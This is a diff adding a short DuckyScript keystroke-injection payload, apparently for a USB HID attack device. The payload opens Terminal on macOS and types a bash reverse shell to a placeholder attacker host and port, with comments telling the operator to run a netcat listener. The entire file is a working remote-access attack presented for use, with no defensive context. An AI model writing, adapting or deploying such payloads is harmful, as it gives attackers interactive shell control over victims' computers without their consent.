@@ -1,0 +1,18 @@
+REM Author: UNC0V3R3D
+REM Description: Opens a reverse bash shell to an attacker-controlled listener on macOS.
+REM Version: 1.0
+REM Category: Remote-Access
+REM Target: macOS 10.15+
+REM Requirements: Listener on ATTACKER_IP:ATTACKER_PORT (e.g. nc -lvnp 4444)
+DELAY 1000
+GUI SPACE
+DELAY 700
+STRING terminal
+ENTER
+DELAY 1500
+STRING bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1 &
+ENTER
+DELAY 1000
+STRING exit
+ENTER
+REM End of payload
